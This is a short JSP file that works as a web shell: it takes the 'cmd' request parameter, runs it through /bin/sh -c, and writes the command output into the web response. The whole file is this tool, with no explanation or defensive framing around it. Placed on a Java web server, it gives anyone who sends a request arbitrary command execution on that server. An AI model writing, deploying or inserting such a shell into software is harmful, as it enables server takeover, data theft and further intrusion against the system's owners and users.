<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
String getcmd = request.getParameter("cmd");
if (getcmd != null) {
 //out.println("Command: " + getcmd + "<br>");
 String[] cmd = {"/bin/sh", "-c", getcmd};
 Process p = Runtime.getRuntime().exec(cmd);
 OutputStream os = p.getOutputStream();
 InputStream in = p.getInputStream();
 DataInputStream dis = new DataInputStream(in);
 String disr = dis.readLine();
 //out.println("<pre>"); 
 while ( disr != null ) {
  out.println(disr); 
  disr = dis.readLine(); 
 }
 //out.println("</pre>"); 
}
%>